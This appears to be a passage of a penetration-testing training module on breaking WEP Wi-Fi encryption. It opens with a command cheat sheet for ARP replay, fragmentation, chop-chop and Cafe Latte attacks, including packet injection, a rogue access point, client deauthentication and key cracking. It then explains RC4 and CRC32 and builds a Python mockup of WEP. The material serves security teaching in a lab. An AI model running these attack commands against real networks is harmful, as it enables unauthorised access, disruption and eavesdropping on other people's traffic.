@@ -1,0 +1,1351 @@
+<html><head></head><body><p>
+  </p><div class="container"><p></p>
+<link rel="stylesheet" href="modules\style.css">
+
+
+
+
+
+
+<p>
+  </p><div class="container"><p></p>
+<link rel="stylesheet" href="modules\style.css">
+
+
+<h1 id="wired-equivalent-privacy-wep-attacks">Wired Equivalent Privacy (WEP) Attacks</h1>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<h2 id="arp-request-replay-attack">ARP Request Replay Attack</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><p><code>sudo airmon-ng start wlan0</code><br></p></td>
+<td>Enable monitor mode.</td>
+</tr>
+<tr>
+<td><code>iwconfig</code></td>
+<td>Configure wireless interfaces / confirm monitor mode is enabled.</td>
+</tr>
+<tr>
+<td><code>sudo airodump-ng wlan0mon -c 1 -w WEP</code></td>
+<td>Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Station_MAC&gt; wlan0mon</code></td>
+<td>Launch ARP Request Replay attack.</td>
+</tr>
+<tr>
+<td><code>sudo aircrack-ng -b &lt;AP_MAC&gt; WEP-01.cap</code></td>
+<td>Crack the WEP key using the PTW statistical attack.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="fragmentation-attack">Fragmentation Attack</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>sudo airmon-ng start wlan0</code></td>
+<td>Enable monitor mode.</td>
+</tr>
+<tr>
+<td><code>sudo airodump-ng wlan0mon -c 1 -w WEP</code></td>
+<td>Scan for available Wi-Fi networks and their associated clients, saving the traffic to a capture file.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng -5 -b &lt;AP_MAC&gt; -h &lt;station_MAC&gt; wlan0mon</code></td>
+<td>Initiate the fragmentation attak</td>
+</tr>
+<tr>
+<td><code>sudo tcpdump -s 0 -n -e -r replay_scr-0805-191842.cap</code></td>
+<td>Identify the source and destination IP addresses</td>
+</tr>
+<tr>
+<td><code>packetforge-ng -0 -a &lt;AP_MAC&gt; -h &lt;Station_MAC&gt; -k &lt;AP_IP&gt; -l &lt;Station_IP&gt; -y fragment-0805-191851.xor -w forgedarp.cap</code></td>
+<td>Forge an ARP request using the captured PRGA (.xor) bytes.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng -2 -r forgedarp.cap -h &lt;Source_MAC&gt; wlan0mon</code></td>
+<td>Inject the forged packet using interactive packet replay.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Station_MAC&gt; wlan0mon</code></td>
+<td>Launch ARP Request Replay attack (to accelerate IV generation.)</td>
+</tr>
+<tr>
+<td><code>sudo aircrack-ng -b &lt;AP_MAC&gt; WEP-01.cap</code></td>
+<td>Crack the WEP key using the PTW statistical attack.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="korek-chop-chop-attack">Korek Chop Chop Attack</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><p><code>sudo aireplay-ng -4 -b &lt;AP_MAC&gt; -h &lt;Station_MAC&gt; wlan0mon</code><br></p></td>
+<td>Start the Korek Chop Chop attack.</td>
+</tr>
+<tr>
+<td><code>sudo tcpdump -s 0 -n -e -r replay_dec-0805-221220.cap</code></td>
+<td>Identify the source and destination IP addresses.</td>
+</tr>
+<tr>
+<td><code>packetforge-ng -0 -a &lt;AP_MAC&gt; -h &lt;Station_MAC&gt; -k &lt;AP_IP&gt; -l &lt;Station_IP&gt; -y fragment-0805-191851.xor -w forgedarp.cap</code></td>
+<td>Forge an ARP request using the captured PRGA (.xor) bytes.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng -2 -r forgedarp.cap -h &lt;Source_MAC&gt; wlan0mon</code></td>
+<td>Inject the forged packet using interactive packet replay.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng -3 -b &lt;AP_MAC&gt; -h &lt;Station_MAC&gt; wlan0mon</code></td>
+<td>Launch ARP Request Replay attack (to accelerate IV generation.)</td>
+</tr>
+<tr>
+<td><code>sudo aircrack-ng -b &lt;AP_MAC&gt; WEP-01.cap</code></td>
+<td>Crack the WEP key using the PTW statistical attack.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="the-cafe-latte-attack">The Cafe Latte Attack</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><p><code>sudo aireplay-ng -6 -D -b &lt;AP_MAC&gt; -h &lt;Station_MAC&gt; wlan0mon</code><br></p></td>
+<td>Start the Cafe Latte attack.</td>
+</tr>
+<tr>
+<td><code>sudo airbase-ng -c 1 -a &lt;AP_BSSID&gt; -e "&lt;AP_ESSID&gt;" wlan0mon -W 1 -L</code></td>
+<td>Launch fake access point. Our rogue AP should have identical ESSID/BSSID as the target AP.</td>
+</tr>
+<tr>
+<td><code>sudo aireplay-ng -0 10 -a &lt;AP_MAC&gt; -c &lt;Station_MAC&gt; wlan0mon</code></td>
+<td>De-authenticate a connected station.</td>
+</tr>
+<tr>
+<td><code>sudo aircrack-ng -b &lt;AP_MAC&gt; WEP-01.cap</code></td>
+<td>Crack the WEP key using the PTW statistical attack.</td>
+</tr>
+</tbody>
+</table>
+<h2 id="additional-wep-cracking">Additional WEP Cracking</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>aircrack-ng -S</code></td>
+<td>Benchmark CPU performance.</td>
+</tr>
+<tr>
+<td><code>sudo airodump-ng wlan0mon -c 1 -w HTB --ivs</code></td>
+<td>Capture only initialization vectors.</td>
+</tr>
+<tr>
+<td><code>aircrack-ng -K HTB.ivs</code></td>
+<td>Crack the WEP key using the Korek method.</td>
+</tr>
+<tr>
+<td><code>airdecap-ng -w &lt;hex_key&gt; WEP-01.cap</code></td>
+<td>Decrypt a WEP-encrypted capture file.</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="wired-equivalent-privacy-overview">Wired Equivalent Privacy Overview</h2>
+<hr>
+<p>Open networks are vulnerable to eavesdropping because their traffic is not encrypted. To address this, Wired Equivalent Privacy (WEP) was introduced in 1997 as part of the <a href="https://www.ieee802.org/11/">IEEE 802.11</a> standard. It aimed to provide a level of privacy for data transmitted over wireless networks.</p>
+<p>WEP, being an older standard, offers valuable lessons for us when dealing with communication ciphers. It has since been replaced by Wi-Fi Protected Access, but can still be found in some business environments. WEP makes use of initialization vectors (IVs), a 40-bit or 104-bit shared key (also referred to as the WEP key), the Rivest Cipher 4 (RC4) algorithm, and cyclic redundancy checks (CRC32) to provide encryption for wireless communications. When WEP was developed, it originally incorporated a 24-bit initialization vector due to U.S. government export restrictions on cryptographic technologies, which limited key sizes. After these restrictions were lifted, WEP was updated to support a 128-bit encryption key, but incidentally it continued to use the same 24-bit initialization vector.</p>
+<p>Although WEP held firm as a standard for a while, the discovery of different attacks led to multiple ways of compromising the shared key. This is due to the initialization vectors and cyclic redundancy checks used in the overall cipher. Regardless of whether WEP uses a 64-bit or 128-bit encryption key, the IV remains 24 bits. As a result, the algorithm is prone to repeated IVs during transmission. This has since enabled adversaries to construct decryption tables and retrieve the key with a high degree of statistical certainty, typically through packet building and replay attacks.</p>
+<hr>
+<h3 id="rc4-algorithm">RC4 Algorithm</h3>
+<p>In cryptography, <code>RC4 (Rivest Cipher 4)</code>, also known as <code>ARC4</code> or <code>ARCFOUR (Alleged RC4)</code>, is a stream cipher. It was designed by Ron Rivest of <a href="https://en.wikipedia.org/wiki/RSA_Security">RSA Security</a> in 1987 and became part of several commonly used encryption protocols and standards (including WEP) due to its simplicity and high speed.</p>
+<p>RC4 is a symmetric cipher, which means the same key is used for both encryption and decryption. It generates a stream of bits that are XORed with the plaintext to produce the ciphertext. To decrypt the data, the ciphertext is XORed with the same key stream to recover the plaintext.</p>
+<p>RC4 consists of two key components:</p>
+<ol>
+<li>Key Scheduling Algorithm (KSA)</li>
+<li>Pseudo Random Generation Algorithm (PRGA)</li>
+</ol>
+<p>The <code>Key Scheduling Algorithm</code> initializes the state table using the WEP key and the initialization vector (IV). The <code>Pseudo Random Generation Algorithm</code> produces the keystream used for the encryption and decryption process. In the upcoming section, we will delve deeper into the RC4 algorithm, exploring its mechanisms and functionality in greater detail.</p>
+<hr>
+<h3 id="wep-authentication">WEP Authentication</h3>
+<p>WEP supports two types of authentication systems: <code>Open</code> and <code>Shared</code>. In open authentication, a client does not provide any credentials when connecting to the access point (AP). However, to encrypt and decrypt data frames, the client must have the correct key.</p>
+<p>In shared authentication, a challenge text is sent to the client during the authentication process. The client must encrypt this challenge text with the WEP key and send it back to the AP for verification. This process allows the client to prove that it knows the key. Upon receiving the encrypted challenge text, the AP attempts to decrypt it. If the decryption is successful and the decrypted text matches the original challenge text, the client is permitted to associate with the access point.</p>
+<p><img src="storage\modules\222\Auth_Methods\Wep_process.png" alt="Diagram showing a four-step authentication process between Client and AP: 1. Client sends Authentication Request to AP. 2. AP sends Challenge to Client. 3. Client sends Challenge Response to AP. 4. AP confirms Success or Failure to Client."></p>
+<p>Below is a step-by-step description of the shared WEP authentication process, which can be visualized in the diagram above:</p>
+<ol>
+<li><code>Authentication Request</code>: The process begins with the client sending an authentication request to the access point.</li>
+<li><code>Challenge</code>: The access point responds with a custom authentication response that includes challenge text for the client.</li>
+<li><code>Challenge Response</code>: The client then replies with the encrypted challenge, which is encrypted using the WEP key.</li>
+<li><code>Verification</code>: The AP decrypts the challenge, and sends back an indication of success or failure.</li>
+</ol>
+<p>The use of WEP is less common in modern environments, but can still be encountered in older systems with compatibility issues. As such, WEP attacks are a valuable addition to a wireless pentester's arsenal.</p>
+<p>Note: After spawning, please wait <code>3</code>-<code>4</code> minutes before connecting to the target(s).</p>
+<hr>
+<h2 id="wep-encryption-algorithm-overview">WEP Encryption Algorithm Overview</h2>
+<hr>
+<p>Wired Equivalent Privacy utilizes 40-bit or 104-bit keys in combination with a 24-bit initialization vector to create the seed. Due to the correlation between the two, the <a href="https://en.wikipedia.org/wiki/Fluhrer,_Mantin_and_Shamir_attack">FMS (Fluhrer, Mantin, and Shamir)</a> and <a href="https://eprint.iacr.org/2007/120.pdf">PTW (Pyshkin, Tews, and Weinmann)</a> attacks allow us to retrieve a correct key after gathering enough packets. Alternatively, brute force attacks exist on a per-packet basis, which also allow us to retrieve the key. Packet-building attacks, such as ARP replay, fragmentation, and others, enable us to expedite the process of initialization vector generation. The goal is to collect enough initialization vectors in a capture file to crack the key using probability algorithms.</p>
+<p><img src="storage\modules\185\Diagrams\wep_1.png" alt="Flowchart of RC4 encryption process: Seed with 24-bit IV and 40/104-bit Key enters RC4 Algorithm, using KSA and PRGA, producing Final KeyStream. XOR operation combines KeyStream with Packet Plain Text and CRC32, resulting in Cipher Text with IV."></p>
+<p>The algorithm for WEP follows a fairly standard procedure for generating a keystream through the RC4 algorithm, which then undergoes a bitwise operation with the packet plaintext and cyclic redundancy check. It can be broken down into the following steps:</p>
+<ul>
+<li>The 24-bit <code>Initialization Vector (IV)</code> is generated.</li>
+<li>The <code>40-bit</code> or <code>104-bit Key</code> is combined with the initialization vector to make the <code>Seed</code>.</li>
+<li>The <code>Seed</code> is passed through the stages of the RC4 algorithm, which includes the Key Scheduling Algorithm and the Pseudo Random Generation Algorithm, to create the <code>Keystream</code>.</li>
+<li>The <code>Cyclic Redundancy Check</code> is calculated and appended to the <code>Packet Plain Text</code>, forming the <code>ICV message</code>.</li>
+<li>The unencrypted <code>ICV message</code> and <code>Keystream</code> undergo a <code>XOR Bitwise Operation</code> to produce the <code>Final Ciphertext</code>.</li>
+<li>The IV is concatenated with the final ciphertext, resulting in the <code>final message</code> to be transmitted.</li>
+</ul>
+<p>At a high level, the algorithm for Wired Equivalent Privacy (WEP) utilizes random seeds. However, the 24-bit initialization vector (IV) has a limited range, making it prone to repetition. In tandem with this, the IV is transmitted in cleartext alongside the encrypted data. This is where the problem innately lies: we know one of the two inputs for the RC4 algorithm, which allows us to limit our guesses and use probability-based analysis to determine the key. As a result, attackers are able to crack the key much more quickly than any WPA network. In the following sections, we will explore how to reconstruct each part of the WEP algorithm using Python.</p>
+<hr>
+<h2 id="seed-generation-and-the-rc4-algorithm">Seed Generation and the RC4 Algorithm</h2>
+<hr>
+<p>In order to fully utilize RC4 encryption, two main inputs are required. The first is the message to be encrypted. The second input is the key, which, in standard RC4, is directly passed into the algorithms that initialize the cipher. However, in the case of WEP, the key is actually a <code>'seed'</code> formed by concatenating a randomly generated 24-bit initialization vector (IV) with a 40-bit, 104-bit, or in some cases, 232-bit general key.</p>
+<p>The RC4 algorithm operates in two phases: the <code>Key Scheduling Algorithm (KSA)</code> and the <code>Pseudo-Random Generation Algorithm (PRGA)</code>. The KSA initializes and permutates the internal state array, using the key (or seed, in WEP's case) to shuffle its values. This shuffled array is then processed by the PRGA, which produces a keystream of the same length as the plaintext message. The keystream is XORed with the message to generate the ciphertext.</p>
+<p><img src="storage\modules\185\Diagrams\wep_3.png" alt="Diagram of encryption process: 40-bit Hexadecimal Key and 24-bit Initialization Key form a 64-bit Seed. This seed enters the Key Scheduling Algorithm, then the Pseudo Random Generation Algorithm, producing the PRGA Keystream, using Rivest Cipher 4."></p>
+<p>Fortunately, we don't have to write out this entire algorithm ourselves. The Python <code>PyCryptodome</code> library has an <a href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/arc4.html">ARC4 </a>module for this very purpose. Let's use it to encrypt something.</p>
+<hr>
+<p>With this example script, our goal is to encrypt the phrase 'Wired Equivalent Privacy' with both a 64-bit and 128-bit seed. First, we generate the random 3-byte initialization vector (IV) using <code>get_random_bytes</code>. We then concatenate the IV and Key together to make the full seed. The seed is passed into the two phases of the RC4 algorithm to create the keystream, which is then XORed with our 'Wired Equivalent Privacy Message'.</p>
+<p>Code: python</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> Crypto
+<span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes
+<span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4
+
+<span class="hljs-comment"># Generating the 24-bit (3 byte) Initialization Vector</span>
+IV = get_random_bytes(<span class="hljs-number">3</span>)
+
+<span class="hljs-comment"># Creating the 40-bit key (5 bytes)</span>
+key = b<span class="hljs-string">'\x01\x02\x03\x04\x05'</span>
+Seed64 = IV + key
+
+<span class="hljs-comment"># We can also use a 104-bit key (13 bytes) </span>
+key104 = b<span class="hljs-string">'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'</span>
+Seed128 = IV + key104
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'Initialization Vector: '</span> + str(IV))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'64-bit Seed: '</span> + str(Seed64))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'128-bit Seed: '</span> + str(Seed128))
+
+<span class="hljs-comment"># We must use the RC4 cipher to encrypt the plain text. We will explore how to generate the CRC32 and ICV Message in the next session.</span>
+<span class="hljs-comment"># The RC4 cipher consists of the Key-Scheduling Algorithm and the Pseudo-random Generation Algorithm, which outputs the keystream.</span>
+
+<span class="hljs-comment"># Generating the keystream using RC4</span>
+keystream = ARC4.<span class="hljs-keyword">new</span>(Seed64)
+keystreamB = ARC4.<span class="hljs-keyword">new</span>(Seed128)
+
+<span class="hljs-comment"># The plain text is XORed with the keystream to produce the ciphertext.</span>
+msg = keystream.encrypt(b<span class="hljs-string">'Wired Equivalent Privacy'</span>)
+<span class="hljs-built_in">print</span>(msg)
+</code></pre>
+<p>We can see the algorithm in action using the following command.</p>
+<p>  Seed Generation and the RC4 Algorithm</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 SeedGen.py
+
+Initialization Vector: b'y#K'
+64-bit Seed: b'yK<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05'
+128-bit Seed: b'yK<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\t</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\r</span>'
+b')c<span class="hljs-symbol">\x</span>e96<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>ab<span class="hljs-symbol">\x</span>10<span class="hljs-symbol">\x</span>9b<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>dd<span class="hljs-symbol">\x</span>19<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>f5<span class="hljs-symbol">\x</span>81<span class="hljs-symbol">\x</span>d5<span class="hljs-symbol">\x</span>e2<span class="hljs-symbol">\x</span>e9-x<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>96<span class="hljs-variable">%n'</span>
+</code></pre>
+<p>  Seed Generation and the RC4 Algorithm</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ python3 SeedGen.py
+
+Initialization Vector: b'<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>10o'
+64-bit Seed: b'<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>10o<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05'
+128-bit Seed: b'<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>10o<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>02<span class="hljs-symbol">\x</span>03<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>05<span class="hljs-symbol">\x</span>06<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\t</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>0c<span class="hljs-symbol">\r</span>'
+b'<span class="hljs-symbol">\x</span>f4kR<span class="hljs-symbol">\x</span>06/3<span class="hljs-symbol">\x</span>08 O<span class="hljs-symbol">\x</span>9a<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>99<span class="hljs-symbol">\x</span>9a<span class="hljs-symbol">\x</span>93<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>16<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>7f<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>1d<span class="hljs-symbol">\x</span>d1<span class="hljs-symbol">\x</span>1b<span class="hljs-symbol">\x</span>b7'
+</code></pre>
+<p>It is worth noting that each iteration of this cipher is different, as the initialization vector is randomly generated per packet. Generally, stream ciphers use a key that is the same length as the message being encrypted. This means that in order to decrypt the message, either the key or the original plaintext is required. However, in the case of WEP, the IV is attached to the packet. Otherwise, it would be impossible to decrypt without the full seed. The correlation between the IV and the final message has allowed attackers to break this once theoretically sound algorithm apart.</p>
+<p>Next, we will be focusing on CRC32 generation to create the final ICV message. Once this is done, we will be able to combine all of the examples together to create a full mockup algorithm for WEP.</p>
+<hr>
+<h2 id="crc32-generation-wep-s-icv-algorithm-">CRC32 Generation (WEP's ICV Algorithm)</h2>
+<hr>
+<p>Wired Equivalent Privacy utilizes a standard <a href="https://fuchsia.googlesource.com/third_party/wuffs/+/HEAD/std/crc32/README.md">CRC32 checksum</a>, which is computed over the packet plaintext and subsequently appended to it. The combined plaintext/checksum block is then XORed with the RC4 keystream to produce the final ciphertext. The <code>KoreK Chop Chop Attack</code> is notorious for abusing the CRC32 hashing function to decrypt a packet without knowing the key. Simply put, this is done by removing a byte of the final ciphertext, calculating the new ICV, then sending the modified packet back to the network. Based on the network's response (whether the packet is accepted or rejected), the attacker can infer the byte's true value. By repeating this process for each byte, the attacker can gradually decrypt the entire packet. We will explore this in further detail later.</p>
+<p>Generally, the CRC32 hashing algorithm is the following:</p>
+<p><code>g(x) = x32 + x26 + x23 + x22 + x16 + x12 + x11 + x10 + x8 + x7 + x5 + x4 + x2 + x + 1</code></p>
+<p><img src="storage\modules\185\Diagrams\wep_2.png" alt="Diagram showing CRC32 process: Packet Plain Text and Checksum combine to form Packet Plain Text + Checksum, processed by CRC32."></p>
+<p>We can calculate the CRC32 checksum using the Python <a href="https://docs.python.org/3/library/zlib.html#zlib.crc32">zlib</a> library. With the script below, we will take our packet plaintext 'Something Sensitive' and find the checksum value for it.</p>
+<p>Code: python</p>
+<pre><code class="lang-python">import <span class="hljs-literal">zlib</span>
+
+<span class="hljs-comment"># First we declare our packet plaintext. In normal communications this is the actual plaintext data.</span>
+packetplaintext = b<span class="hljs-string">'Something Sensitive'</span>
+
+<span class="hljs-comment"># We then use the zlib library to calculate the CRC32.</span>
+crc32 = <span class="hljs-literal">zlib</span>.crc32(packetplaintext)
+
+<span class="hljs-literal">print</span>(crc32)
+</code></pre>
+<p>We can see CRC32 in action by employing the following command.</p>
+<p>  CRC32 Generation (WEP's ICV Algorithm)</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ python3 CRC32.py
+
+<span class="hljs-number">2950664974</span>
+</code></pre>
+<p>At this point, we have both inputs for the RC4 algorithm and can proceed with constructing a full mockup of the WEP algorithm. WEP contains numerous vulnerabilities, each of which can be exploited through different stages of the algorithm.</p>
+<hr>
+<h2 id="putting-together-the-algorithms">Putting Together the Algorithms</h2>
+<hr>
+<p>We can put together the Seed Generation and CRC32 Generation scripts with the RC4 library to construct a complete mockup of the WEP algorithm. In this combined script, we first add the initialization vector (IV) and the key, forming the seed. Next, we use the seed to produce the keystream. We then create our message to be encrypted by calculating the CRC32 checksum and concatenating it with our packet plaintext. The resulting plaintext block is subsequently passed into RC4's encrypt function to generate our final ciphertext. Lastly, the initialization vector is prepended to the final ciphertext, resulting in our final message to be transmitted.</p>
+<p>Code: python</p>
+<pre><code class="lang-python"><span class="hljs-keyword">import</span> Crypto
+<span class="hljs-keyword">from</span> Crypto.Random <span class="hljs-keyword">import</span> get_random_bytes
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4
+<span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">import</span> zlib
+
+<span class="hljs-comment"># First we declare our packet plain text, this is the unencrypted message that we need to pass through our mock WEP algorithm</span>
+packetplaintext = b<span class="hljs-string">'Something Sensitive'</span>
+
+<span class="hljs-comment"># Then we calculate the CRC32 checksum (32-bit integer) of our packet plain text</span>
+crc32 = zlib.crc32(packetplaintext)
+
+<span class="hljs-comment"># Generating the 24-bit Initialization Vector (3 bytes)</span>
+IV = get_random_bytes(<span class="hljs-number">3</span>)
+
+<span class="hljs-comment"># Declaring our 40-bit key (5 bytes) and 64-bit seed (8 bytes)</span>
+key = b<span class="hljs-string">'\x01\x02\x03\x04\x05'</span>
+Seed64 = IV + key 
+
+<span class="hljs-comment"># Declaring our 104-bit key (13 bytes) and 128-bit seed</span>
+key104 = b<span class="hljs-string">'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D'</span>
+Seed128 = IV + key104 
+
+<span class="hljs-comment"># Generating the keystreams</span>
+keystream = ARC4.<span class="hljs-keyword">new</span>(Seed64)
+keystreamB = ARC4.<span class="hljs-keyword">new</span>(Seed128)
+
+<span class="hljs-comment"># Constructing our ICV Message</span>
+crc32byte = crc32.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">'big'</span>)  <span class="hljs-comment"># Convert CRC32 checksum from integer to bytes</span>
+ICVMessage = packetplaintext + crc32byte <span class="hljs-comment"># Concatenate the packet plaintext and CRC32 checksum</span>
+
+<span class="hljs-comment"># Final Ciphertext, made by XORing the ICV Message and keystream</span>
+msg = keystream.encrypt(ICVMessage)
+msgB = keystreamB.encrypt(ICVMessage) 
+
+<span class="hljs-comment"># Final Message, formed by concatenating the Initialization Vector with the Final Cipher Text</span>
+finalmsg = IV + msg
+finalmsgb = IV + msgB
+
+
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'-------------'</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'CRC32 Checksum: '</span> + str(crc32))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'Initialization Vector: '</span> + str(IV))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'64-bit Seed: '</span> + str(Seed64))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'128-bit Seed: '</span> + str(Seed128))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'-------------'</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'ICV Message: '</span> + str(ICVMessage))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'Cipher Text 64-bit Seed: '</span> + str(msg))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'Cipher Text 128-bit Seed: '</span> + str(msgB))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'-------------'</span>)
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'Final Message 64-bit Seed: '</span> + str(finalmsg))
+<span class="hljs-built_in">print</span>(<span class="hljs-string">'Final Message 128-bit Seed: '</span> + str(finalmsgb))
+</code></pre>
+<p>To put this final mockup algorithm to the test, we employ the following command:</p>
+<p>  Putting Together the Algorithms</p>
+<pre><code class="lang-shell-session">root@htb[/htb]<span class="hljs-formula">$ python3 mockcipher.py
+
+-------------
+CRC32 Checksum: 2950664974
+Initialization Vector: b']~<span class="hljs-tag">\<span class="hljs-name">xb</span></span>7'
+64-bit Seed: b']~<span class="hljs-tag">\<span class="hljs-name">xb</span></span>7<span class="hljs-tag">\<span class="hljs-name">x</span></span>01<span class="hljs-tag">\<span class="hljs-name">x</span></span>02<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span class="hljs-name">x</span></span>04<span class="hljs-tag">\<span class="hljs-name">x</span></span>05'
+128-bit Seed: b']~<span class="hljs-tag">\<span class="hljs-name">xb</span></span>7<span class="hljs-tag">\<span class="hljs-name">x</span></span>01<span class="hljs-tag">\<span class="hljs-name">x</span></span>02<span class="hljs-tag">\<span class="hljs-name">x</span></span>03<span class="hljs-tag">\<span class="hljs-name">x</span></span>04<span class="hljs-tag">\<span class="hljs-name">x</span></span>05<span class="hljs-tag">\<span class="hljs-name">x</span></span>06<span class="hljs-tag">\<span class="hljs-name">x</span></span>07<span class="hljs-tag">\<span class="hljs-name">x</span></span>08<span class="hljs-tag">\<span class="hljs-name">t</span></span><span class="hljs-tag">\<span class="hljs-name">n</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>0b<span class="hljs-tag">\<span class="hljs-name">x</span></span>0c<span class="hljs-tag">\<span class="hljs-name">r</span></span>'
+-------------
+ICV Message: b'Something Sensitive<span class="hljs-tag">\<span class="hljs-name">xaf</span></span><span class="hljs-tag">\<span class="hljs-name">xdf</span></span><span class="hljs-tag">\<span class="hljs-name">x</span></span>93<span class="hljs-tag">\<span class="hljs-name">x</span></span>0e'
+Cipher Text 64-bit Seed: b"y<span class="hljs-tag">\<span class="hljs-name">x</span></span>12uhO<span class="hljs-tag">\<span class="hljs-name">x</span></span>0e<span class="hljs-tag">\<span class="hljs-name">x</span></span>99<span class="hljs-tag">\<span class="hljs-name">xa</span></span>0<span class="hljs-tag">\<span class="hljs-name">xd</span></span>5<span class="hljs-tag">\<span class="hljs-name">xe</span></span>08<span class="hljs-tag">\<span class="hljs-name">x</span></span>11<span class="hljs-tag">\<span class="hljs-name">xc</span></span>6+O'<span class="hljs-tag">\<span class="hljs-name">x</span></span>81%<span class="hljs-tag">\<span class="hljs-name">xf</span></span>6<span class="hljs-tag">\<span class="hljs-name">x</span></span>9a<span class="hljs-tag">\<span class="hljs-name">x</span></span>89<span class="hljs-tag">\<span class="hljs-name">xa</span></span>8<span class="hljs-tag">\<span class="hljs-name">x</span></span>13"
+Cipher Text 128-bit Seed: b'<span class="hljs-tag">\<span class="hljs-name">x</span></span>12u<span class="hljs-tag">\<span class="hljs-name">x</span></span>96<span class="hljs-tag">\<span class="hljs-name">x</span></span>0bA<span class="hljs-tag">\<span class="hljs-name">xc</span></span>1<span class="hljs-tag">\<span class="hljs-name">x</span></span>07<span class="hljs-tag">\<span class="hljs-name">xe</span></span>5a-Wt<span class="hljs-tag">\<span class="hljs-name">x</span></span>84<span class="hljs-tag">\<span class="hljs-name">x</span></span>14/<span class="hljs-tag">\<span class="hljs-name">x</span></span>1d<span class="hljs-tag">\<span class="hljs-name">xa</span></span>6oJ<span class="hljs-tag">\<span class="hljs-name">x</span></span>1d<span class="hljs-tag">\<span class="hljs-name">x</span></span>16_<span class="hljs-tag">\<span class="hljs-name">xdb</span></span>'
+-------------
